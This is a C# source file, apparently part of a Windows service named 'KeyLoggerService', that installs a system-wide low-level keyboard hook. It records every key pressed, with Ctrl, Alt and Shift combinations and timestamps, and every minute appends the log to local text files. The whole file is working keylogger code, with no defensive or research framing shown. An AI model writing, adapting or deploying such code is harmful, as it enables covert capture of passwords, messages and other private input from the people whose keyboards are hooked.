using System;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using KeyLoggerService.HookSetting;

namespace KeyLoggerService.HookSetting.HookManager
{
    public class KeyHookSet : IDisposable
    {
        #region Fields and Properties

        private IntPtr _hookId = IntPtr.Zero;
        private IntPtr _hookModule = IntPtr.Zero;

        private readonly NativeMethods.HookProc _proc;

        private readonly ConcurrentQueue<(string Key, DateTime Time)> _hookQueue = new();
        private readonly System.Threading.Timer _saveTimer;

        private readonly string _dataDir;

        private bool _disposed = false;

        #endregion

        #region Constructor

        public KeyHookSet()
        {
            _proc = HookCallback;
            _dataDir = System.IO.Path.Combine(AppContext.BaseDirectory, "Data");

            // Timer to save data every 1 minute (60000 ms)
            _saveTimer = new System.Threading.Timer(SaveDataCallback, null, Timeout.Infinite, Timeout.Infinite);
        }

        #endregion

        #region Public Methods

        public bool Start()
        {
            try
            {
                var curProcess = Process.GetCurrentProcess();
                var curModule = curProcess.MainModule;
                if (curModule == null)
                    throw new InvalidOperationException("Cannot get current process module.");

                _hookModule = NativeMethods.GetModuleHandle(curModule.ModuleName);
                _hookId = NativeMethods.SetWindowsHookEx(
                    NativeMethods.WH_KEYBOARD_LL,
                    _proc,
                    _hookModule,
                    0);
                Console.WriteLine(Marshal.GetLastWin32Error());
                if (_hookId != IntPtr.Zero)
                {
                    File.AppendAllText(
                     Path.Combine(_dataDir, "SetHookLog.txt"),
                     $"Hook Set Is Success , Hook Id : [{_hookId}] \n");
                    Console.WriteLine($"Hook Set Is Success , Hook Id : [{_hookId}]");
                }
                if (_hookId == IntPtr.Zero)
                {
                    int error = Marshal.GetLastWin32Error();
                    throw new System.ComponentModel.Win32Exception(error, "Failed to set hook." + error);
                }

                _saveTimer.Change(60000, 60000); // Start timer, save every 60s

                return true;
            }
            catch (Exception ex)
            {
                LogError($"Start Hook failed: {ex.Message} {ex.StackTrace}");
                return false;
            }
        }

        public Task ShutdownHook()
        {
            Dispose();
            return Task.CompletedTask;
        }

        #endregion

        #region Hook Callback

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            Console.WriteLine(1);
            if (nCode >= 0 && wParam == (IntPtr)NativeMethods.WM_KEYDOWN)
            {
                var hookStruct = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);

                string keyCombo = GetKeyCombination(hookStruct.vkCode);

                _hookQueue.Enqueue((keyCombo, DateTime.Now));
                Console.WriteLine(keyCombo);  
            }

            return NativeMethods.CallNextHookEx(_hookId, nCode, wParam, lParam);
        }

        #endregion

        #region Helpers

        public void SaveDataCallback(object? state)
        {
            if (_hookQueue.IsEmpty)
                return;

            try
            {
                StringBuilder justKeysBuilder = new();
                StringBuilder fullDataBuilder = new();

                while (_hookQueue.TryDequeue(out var entry))
                {
                    justKeysBuilder.Append(entry.Key + " ");
                    fullDataBuilder.AppendLine($"{entry.Key} | {entry.Time}");
                }

                string justKeysPath = System.IO.Path.Combine(_dataDir, "JustKey.txt");
                string fullDataPath = System.IO.Path.Combine(_dataDir, "FullData.txt");

                System.IO.File.AppendAllText(justKeysPath, justKeysBuilder.ToString() + "\n", Encoding.UTF8);
                System.IO.File.AppendAllText(fullDataPath, fullDataBuilder.ToString(), Encoding.UTF8);

                Console.WriteLine("Data saved to files.");
            }
            catch (Exception ex)
            {
                LogError($"SaveDataCallback error: {ex.Message} {ex.StackTrace}");
            }
        }

        private string GetKeyCombination(int vkCode)
        {
            var key = (Keys)vkCode;

            bool ctrl = (NativeMethods.GetAsyncKeyState((int)Keys.ControlKey) & 0x8000) != 0;
            bool shift = (NativeMethods.GetAsyncKeyState((int)Keys.ShiftKey) & 0x8000) != 0;
            bool alt = (NativeMethods.GetAsyncKeyState((int)Keys.Menu) & 0x8000) != 0;

            StringBuilder combo = new();

            if (ctrl) combo.Append("Ctrl + ");
            if (alt) combo.Append("Alt + ");
            if (shift) combo.Append("Shift + ");

            combo.Append(key.ToString());

            return combo.ToString();
        }

        private void LogError(string message)
        {
            try
            {
                string logPath = System.IO.Path.Combine(_dataDir, "ExeptionLog.txt");
                string logMessage = $"[{DateTime.Now}] {message}\n";
                System.IO.File.AppendAllText(logPath, logMessage);
            }
            catch
            {
                // swallow exceptions on logging to avoid recursion
            }
        }

        #endregion

        #region IDisposable Support

        protected virtual void Dispose(bool disposing)
        {
            if (!_disposed)
            {
                if (disposing)
                {
                    _saveTimer.Dispose();
                }

                if (_hookId != IntPtr.Zero)
                {
                    NativeMethods.UnhookWindowsHookEx(_hookId);
                    _hookId = IntPtr.Zero;
                }

                _disposed = true;
            }
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        ~KeyHookSet()
        {
            Dispose(false);
        }

        #endregion

        #region Structs

        [StructLayout(LayoutKind.Sequential)]
        private struct KBDLLHOOKSTRUCT
        {
            public int vkCode;
            public int scanCode;
            public int flags;
            public int time;
            public IntPtr dwExtraInfo;
        }

        #endregion
    }
}
